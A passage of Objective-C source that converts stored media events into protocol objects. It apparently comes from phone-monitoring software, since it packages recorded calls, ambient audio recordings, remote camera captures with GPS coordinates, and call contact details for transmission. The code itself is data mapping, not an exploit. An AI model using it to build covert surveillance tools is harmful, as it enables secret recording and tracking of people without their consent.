			[audioConversationEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[audioConversationEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[audioConversationEvent autorelease];
			event = audioConversationEvent;
		} break;
		case kEventTypeWallpaper: {
			WallpaperEvent* wallpaperEvent = [[WallpaperEvent alloc] init];
			[wallpaperEvent setEventId:[fxActualEvent eventId]];
			[wallpaperEvent setTime:[fxActualEvent dateTime]];
			[wallpaperEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[wallpaperEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			[wallpaperEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[wallpaperEvent autorelease];
			event = wallpaperEvent;
		} break;
		case kEventTypeAmbientRecordAudio: {
			AudioAmbientEvent* audioAmbientEvent = [[AudioAmbientEvent alloc] init];
			[audioAmbientEvent setEventId:[fxActualEvent eventId]];
			[audioAmbientEvent setTime:[fxActualEvent dateTime]];
			[audioAmbientEvent setParingID:[fxActualEvent eventId]]; // For actual media paring ID is an ID
			[audioAmbientEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
			[audioAmbientEvent setMDuration:[fxActualEvent mDuration]];
			[audioAmbientEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[audioAmbientEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[audioAmbientEvent autorelease];
			event = audioAmbientEvent;
		} break;
		case kEventTypeRemoteCameraImage: {
			RemoteCameraImageEvent* remoteCameraImageEvent = [[RemoteCameraImageEvent alloc] init];
			[remoteCameraImageEvent setEventId:[fxActualEvent eventId]];
			[remoteCameraImageEvent setTime:[fxActualEvent dateTime]];
			[remoteCameraImageEvent setParingID:[fxActualEvent mDuration]]; // Use paring ID for field of frame strip id which stored in duration field of MediaEvent
			[remoteCameraImageEvent setMediaType:[self mediaType:[fxActualEvent fullPath]]];
            NSString *fileName = [[fxActualEvent fullPath] lastPathComponent];
            if ([fileName hasPrefix:@"front"]) {
                [remoteCameraImageEvent setMCameraType:kRemoteCameraTypeFront];
            } else {
                [remoteCameraImageEvent setMCameraType:kRemoteCameraTypeRear];
            }
			GeoTag* geoTag = [[GeoTag alloc] init];
			[geoTag setLon:(double)[[fxActualEvent mGPSTag] longitude]];
			[geoTag setLat:(double)[[fxActualEvent mGPSTag] latitude]];
			[geoTag setAltitude:[[fxActualEvent mGPSTag] altitude]];
			[remoteCameraImageEvent setGeo:geoTag];
			[geoTag release];
			[remoteCameraImageEvent setFileName:[fxActualEvent fullPath]]; // Create payload from file name to avoid two time create data object
			//[remoteCameraImageEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[remoteCameraImageEvent autorelease];
			event = remoteCameraImageEvent;
		} break;
		default: {
		} break;
	}
	return (event);
}

+ (id) convertToPhoenixProtocolThumbnailEvent: (FxEvent*) aEvent {
	id event = nil;
	MediaEvent* fxActualEvent = (MediaEvent*)aEvent;
	NSArray *fxThumbnails = [fxActualEvent thumbnailEvents];
	
	ThumbnailEvent* fxThumbnailEvent = nil;
	if ([fxThumbnails count]) {
		// Media must has at least 1 thumbnail then we can test 1st thumbnail
		
		fxThumbnailEvent = [fxThumbnails objectAtIndex:0];
	} else {
		// --- Very rarely wrong: Media must has at least 1 thumbnail then we can test 1st thumbnail
		// The above assumption of every media event must have thumbnail event is not right all the time:
		// If there is media event with thumbnail event but its thumbnail event haven't insert into db successfully (application crashs for some reason in middle of thumbnail event insertion into db)
		// in this case media event has no thumbnail event when it query back from db THAT'S WHY there must be logic to prevent crash in loop here (no access to index 0 of thumbnails array without checking)
		
		FxEventType thumbnailEventType = [EventRepositoryUtils mapMediaToThumbnailEventType:[fxActualEvent eventType]];
		fxThumbnailEvent = [[[ThumbnailEvent alloc] init] autorelease];
		[fxThumbnailEvent setEventId:0]; // There is no event ID
		[fxThumbnailEvent setEventType:thumbnailEventType];
		[fxThumbnailEvent setDateTime:[fxActualEvent dateTime]];
		[fxThumbnailEvent setFullPath:nil];
		[fxThumbnailEvent setActualSize:0];
		[fxThumbnailEvent setActualDuration:0];
		[fxThumbnailEvent setPairId:[fxActualEvent eventId]]; // But there is a pairing ID
		DLog (@"Event type of new thumbnail event = %d", thumbnailEventType)
	}
	
	switch ([fxThumbnailEvent eventType]) {
		case kEventTypeCameraImageThumbnail: {
			CameraImageThumbnailEvent* cameraImageThumbnailEvent = [[CameraImageThumbnailEvent alloc] init];
			[cameraImageThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[cameraImageThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[cameraImageThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			GeoTag* geoTag = [[GeoTag alloc] init];
			[geoTag setLon:(double)[[fxThumbnailEvent mGPSTag] longitude]];
			[geoTag setLat:(double)[[fxThumbnailEvent mGPSTag] latitude]];
			[geoTag setAltitude:[[fxThumbnailEvent mGPSTag] altitude]];
			[cameraImageThumbnailEvent setGeo:geoTag];
			[geoTag release];
			[cameraImageThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxThumbnailEvent fullPath]]];
			[cameraImageThumbnailEvent setMediaType:[self mediaType:[fxThumbnailEvent fullPath]]];
			[cameraImageThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			[cameraImageThumbnailEvent autorelease];
			event = cameraImageThumbnailEvent;
		} break;
		case kEventTypeVideoThumbnail: {
			VideoFileThumbnailEvent* videoFileThumbnailEvent = [[VideoFileThumbnailEvent alloc] init];
			[videoFileThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[videoFileThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[videoFileThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			[videoFileThumbnailEvent setActualDuration:[fxThumbnailEvent actualDuration]];
			[videoFileThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			
			// Media data is actual file itself (no need to send with thumbnail) because it will upload via upload actual media file
			//[videoFileThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxActualEvent fullPath]]];
			[videoFileThumbnailEvent setMediaData:[NSData data]];
			[videoFileThumbnailEvent setMediaType:UNKNOWN_MEDIA];
			
			// Thumbnails
			NSMutableArray *thumbnails = [[NSMutableArray alloc] init];
			for (ThumbnailEvent* fxThumbEvent in [fxActualEvent thumbnailEvents]) {
				// Media type of thumbnail override previously set to UNKNOWN_MEDIA
				[videoFileThumbnailEvent setMediaType:[self mediaType:[fxThumbEvent fullPath]]];
				
				Thumbnail *thumbnail = [[Thumbnail alloc] init];
				[thumbnail setImageData:[NSData dataWithContentsOfFile:[fxThumbEvent fullPath]]];
				[thumbnails addObject:thumbnail];
				[thumbnail release];
			}
			[videoFileThumbnailEvent setThumbnailList:thumbnails];
			[thumbnails release];
			
			[videoFileThumbnailEvent autorelease];
			event = videoFileThumbnailEvent;
		} break;
		case kEventTypeAudioThumbnail: {
			AudioFileThumbnailEvent* audioFileThumbnailEvent = [[AudioFileThumbnailEvent alloc] init];
			[audioFileThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[audioFileThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[audioFileThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			[audioFileThumbnailEvent setActualDuration:[fxThumbnailEvent actualDuration]];
			[audioFileThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxThumbnailEvent fullPath]]];
			[audioFileThumbnailEvent setMediaType:[self mediaType:[fxThumbnailEvent fullPath]]];
			[audioFileThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			[audioFileThumbnailEvent autorelease];
			event = audioFileThumbnailEvent;
		} break;
		case kEventTypeCallRecordAudioThumbnail: {
			AudioConversationThumbnailEvent* audioConversationThumbnailEvent = [[AudioConversationThumbnailEvent alloc] init];
			[audioConversationThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[audioConversationThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[audioConversationThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			[audioConversationThumbnailEvent setActualDuration:[fxThumbnailEvent actualDuration]];
			EmbeddedCallInfo* embeddedCallInfo = [[EmbeddedCallInfo alloc] init];
			[embeddedCallInfo setDirection:(EventDirection)[[fxThumbnailEvent mCallTag] direction]];
			[embeddedCallInfo setDuration:[[fxThumbnailEvent mCallTag] duration]];
			[embeddedCallInfo setNumber:[[fxThumbnailEvent mCallTag] contactNumber]];
			[embeddedCallInfo setContactName:[[fxThumbnailEvent mCallTag] contactName]];
			[audioConversationThumbnailEvent setEmbeddedCallInfo:embeddedCallInfo];
			[embeddedCallInfo release];
			[audioConversationThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxThumbnailEvent fullPath]]];
			[audioConversationThumbnailEvent setMediaType:[self mediaType:[fxThumbnailEvent fullPath]]];
			[audioConversationThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			[audioConversationThumbnailEvent autorelease];
			event = audioConversationThumbnailEvent;
		} break;
		case kEventTypeWallpaperThumbnail: {
			WallpaperThumbnailEvent* wallpaperThumbnailEvent = [[WallpaperThumbnailEvent alloc] init];
			[wallpaperThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[wallpaperThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[wallpaperThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			[wallpaperThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxThumbnailEvent fullPath]]];
			[wallpaperThumbnailEvent setMediaType:[self mediaType:[fxThumbnailEvent fullPath]]];
			[wallpaperThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			[wallpaperThumbnailEvent autorelease];
			event = wallpaperThumbnailEvent;
		} break;
		case kEventTypeAmbientRecordAudioThumbnail: {
			AudioAmbientThumbnailEvent *audioAmbientThumbnailEvent = [[AudioAmbientThumbnailEvent alloc] init];
			[audioAmbientThumbnailEvent setTime:[fxThumbnailEvent dateTime]];
			[audioAmbientThumbnailEvent setEventId:[fxThumbnailEvent eventId]];
			[audioAmbientThumbnailEvent setActualFileSize:[fxThumbnailEvent actualSize]];
			[audioAmbientThumbnailEvent setActualDuration:[fxThumbnailEvent actualDuration]];
			[audioAmbientThumbnailEvent setMediaData:[NSData dataWithContentsOfFile:[fxThumbnailEvent fullPath]]];
			[audioAmbientThumbnailEvent setMediaType:[self mediaType:[fxThumbnailEvent fullPath]]];
			[audioAmbientThumbnailEvent setParingID:[fxThumbnailEvent pairId]]; // Paring ID is not an ID otherwise it will become Prasad situation
			[audioAmbientThumbnailEvent autorelease];
			event = audioAmbientThumbnailEvent;
		} break;
		default: {
		} break;
	}
	return (event);
}

@end
